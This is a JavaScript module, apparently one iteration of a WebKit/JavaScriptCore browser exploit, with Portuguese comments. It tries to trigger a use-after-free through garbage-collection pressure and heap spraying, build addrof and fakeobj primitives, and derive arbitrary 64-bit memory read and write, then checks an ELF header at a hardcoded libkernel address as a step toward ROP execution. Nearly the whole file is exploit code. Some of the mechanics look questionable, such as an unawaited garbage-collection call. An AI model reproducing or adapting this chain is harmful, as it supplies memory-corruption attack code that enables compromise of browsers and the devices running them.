// js/script3/testArrayBufferVictimCrash.mjs (R63 - Simplificação Radical e Final)
// =======================================================================================
// ESTRATÉGIA R63:
// Abandono dos padrões complexos de Vítima-Controlador.
// Retorno à abordagem mais direta e robusta: usar o próprio `dangling_ref`
// como ferramenta de R/W, com gerenciamento de estado rigoroso para garantir
// que o ponteiro do butterfly seja restaurado após cada operação.
// Esta é a implementação mais limpa e provável de funcionar.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE = "ROP_Execution_RealRW_R63";

const ftoi = (val) => new AdvancedInt64(new Uint32Array(new Float64Array([val]).buffer)[0], new Uint32Array(new Float64Array([val]).buffer)[1]);
const itof = (val) => { const b = new ArrayBuffer(8); const i = new Uint32Array(b); i[0] = val.low(); i[1] = val.high(); return new Float64Array(b)[0]; };

export async function runStableUAFPrimitives_R51() {
    logS3(`--- Iniciando ${FNAME_MODULE}: Simplificação Radical ---`, "test");
    
    let final_result = { success: false, message: "Falha na cadeia de exploit." };

    try {
        logS3("--- FASE 1 & 2: Obtendo addrof e fakeobj ---", "subtest");
        let dangling_ref = createDanglingRefToFloat64Array();
        let holder = {obj: null}; 
        const addrof = (obj) => {
            holder.obj = obj;
            dangling_ref.a = holder; 
            return ftoi(dangling_ref.b);
        };
        const fakeobj = (addr) => {
            addrof({dummy: 1}); // Garante que dangling_ref.a aponte para holder
            dangling_ref.b = itof(addr);
            return dangling_ref.a.obj;
        };
        logS3("   Primitivas `addrof` e `fakeobj` construídas.", "vuln");

        logS3("--- FASE 3: Construindo Leitura/Escrita Arbitrária (FINAL) ---", "subtest");
        const { read64, write64 } = buildDirectReadWrite(dangling_ref, addrof, fakeobj, holder);
        logS3("   Primitivas `read64` e `write64` FINAIS construídas!", "good");
        
        logS3("--- FASE 4: Verificando os endereços base na MEMÓRIA REAL ---", "subtest");
        const libkernel_base = new AdvancedInt64("0x80FCA0000");

        const libkernel_magic = read64(libkernel_base);
        logS3(`   Endereço base da libkernel: 0x${libkernel_base.toString(true)}`, "info");
        logS3(`   Bytes lidos da MEMÓRIA REAL: 0x${libkernel_magic.toString(true)}`, "leak");

        if (!libkernel_magic.toString().endsWith("464c457f")) { // \x7FELF
             throw new Error(`Magic number da libkernel inválido! Lido: 0x${libkernel_magic.toString(true)}`);
        }
        logS3("   🎉 SUCESSO FINAL: Magic number ELF da libkernel validado na memória REAL! 🎉", "vuln");

        final_result = { success: true, message: "SUCESSO! Primitiva de leitura REAL e ESTÁVEL validada." };

    } catch (e) {
        final_result.message = `Exceção na cadeia de exploit: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_MODULE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        final_result
    };
}


// =======================================================================================
// IMPLEMENTAÇÃO FINAL E DIRETA DE LEITURA/ESCRITA ARBITRÁRIA (R63)
// =======================================================================================
function buildDirectReadWrite(dangling_ref, addrof, fakeobj, holder) {
    // Garante que o estado inicial de 'dangling_ref.a' está salvo e aponta para 'holder'.
    addrof({dummy_setup: 1});
    holder.original_a = dangling_ref.a;

    const read64 = (address) => {
        // 1. Corrompe `dangling_ref.a` (o butterfly) para apontar para o endereço que queremos ler.
        //    O `fakeobj` cria um objeto JS que representa esse ponteiro.
        dangling_ref.a = fakeobj(address);

        // 2. Lê `dangling_ref.b` (o primeiro elemento do array), que agora está lendo
        //    diretamente do `address` desejado. `ftoi` converte o resultado para AdvancedInt64.
        const value = ftoi(dangling_ref.b);
        
        // 3. RESTAURA O ESTADO ORIGINAL. Isso é a chave para a estabilidade, garantindo
        //    que a próxima chamada a `addrof` ou `fakeobj` encontre o estado que espera.
        dangling_ref.a = holder.original_a;

        return value;
    };

    const write64 = (address, value) => {
        // A mesma lógica de salvar, corromper, operar e restaurar.
        const original_a = holder.original_a; // Usa o 'a' original salvo
        
        dangling_ref.a = fakeobj(address);
        dangling_ref.b = itof(value); // `itof` espera um AdvancedInt64, que é `value`.
        
        dangling_ref.a = original_a;
    };

    return { read64, write64 };
}


// --- Funções Auxiliares UAF (sem alterações) ---
async function triggerGC() {
    try { const g = []; for (let i=0; i<500; i++) { g.push(new ArrayBuffer(1024*128)); } } catch (e) {}
    await PAUSE_S3(500);
}

function createDanglingRefToFloat64Array() {
    let dangling_ref = null;
    function createScope() {
        const victim = { a: 0.1, b: 0.2 };
        dangling_ref = victim;
        for (let i = 0; i < 100; i++) { victim.a += 0.01; }
    }
    createScope();
    triggerGC();
    const spray_arrays = [];
    for (let i = 0; i < 512; i++) { spray_arrays.push(new Float64Array(2)); }
    return dangling_ref;
}
